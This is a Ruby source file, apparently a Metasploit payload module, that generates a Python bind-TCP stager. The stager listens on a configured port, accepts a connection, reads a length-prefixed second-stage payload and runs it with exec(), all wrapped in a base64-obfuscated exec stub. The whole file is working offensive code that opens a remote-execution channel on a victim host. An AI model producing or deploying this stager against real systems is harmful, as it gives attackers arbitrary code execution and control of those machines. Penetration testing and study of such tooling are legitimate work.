# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex bind_tcp payload generation for Python
#
###

module Payload::Python::BindTcp

  include Msf::Payload::Python::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port: datastore['LPORT'],
      host: datastore['LHOST']
    }

    generate_bind_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  def generate_bind_tcp(opts={})
    # Set up the socket
    cmd  = "import socket,struct\n"
    cmd << "b=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
    cmd << "b.bind(('#{opts[:host]}',#{opts[:port]}))\n"
    cmd << "b.listen(1)\n"
    cmd << "s,a=b.accept()\n"
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    b64_stub  = "import base64,sys;exec(base64.b64decode("
    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
    b64_stub << Rex::Text.encode_base64(cmd)
    b64_stub << "')))"
    b64_stub
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end


